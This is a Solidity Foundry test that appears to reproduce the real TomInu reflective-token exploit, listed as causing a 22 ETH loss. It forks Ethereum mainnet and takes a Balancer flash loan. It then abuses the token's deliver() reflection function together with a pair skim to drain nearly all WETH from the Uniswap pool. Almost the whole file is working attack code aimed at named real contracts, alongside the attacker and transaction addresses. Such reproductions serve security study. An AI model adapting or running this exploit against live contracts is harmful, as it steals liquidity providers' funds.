// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// Total lost: 22 ETH
// Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
// Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9
// Vulnerable Contract: 0x2d0e64b6bf13660a4c0de42a0b88144a7c10991f
// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668
//            https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668

// @Analysis
// https://twitter.com/libevm/status/1618731761894309889

contract TomInuExploit is Test {
    IWETH private constant weth =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    reflectiveERC20 private constant tinu =
        reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);

    IBalancerVault private constant balancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IRouter private constant router =
        IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant pair =
        IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);

    function setUp() public {
        vm.createSelectFork("mainnet", 16489408);
    }

    function compareStrings(string memory a, string memory b) public pure returns (bool) {
        return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b));
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker tinu balance",
            tinu.balanceOf(address(this)),
            tinu.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker weth balance",
            weth.balanceOf(address(this)),
            weth.decimals()
        );
        emit log_named_decimal_uint(
            "Pair tinu balance",
            tinu.balanceOf(address(pair)),
            tinu.decimals()
        );
        emit log_named_decimal_uint(
            "Pair weth balance",
            weth.balanceOf(address(pair)),
            weth.decimals()
        );
        if (!compareStrings(tips, "After tinu deliver 2") && !compareStrings(tips, "After exploit")) {
            emit log_named_decimal_uint(
                "tinu tinu balance",
                tinu.balanceOf(address(tinu)),
                tinu.decimals()
            );
            emit log_named_decimal_uint(
                "tinu weth balance",
                weth.balanceOf(address(tinu)),
                weth.decimals()
            );
        }
        emit log_string("");
    }

    function testExploit() external {
        // flashloan weth from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 104.85 ether;

        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function swap_pair_weth_tinu(uint256 amount) internal {
        weth.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(tinu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            type(uint).max
        );
    }

    function swap_pair_tinu_weth(uint256 amount) internal {
        tinu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(tinu);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            type(uint).max
        );
    }

    function receiveFlashLoan(
        reflectiveERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        print("Before exploit");

        swap_pair_weth_tinu(weth.balanceOf(address(this)));

        // give away tinu
        tinu.deliver(tinu.balanceOf(address(this)));

        print("After tinu deliver");

        pair.skim(address(this));

        print("After tinu skim");

        tinu.deliver(tinu.balanceOf(address(this)));

        print("After tinu deliver 2");

        pair.swap(
            0,
            weth.balanceOf(address(pair)) - 0.01 ether,
            address(this),
            ""
        );

        weth.transfer(address(balancerVault), amounts[0]);

        print("After exploit");
    }
}

/* -------------------- Interface -------------------- */
interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function deliver(uint256 tAmount) external;

    function tokenFromReflection(uint256 rAmount) external returns (uint256);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint256);
}
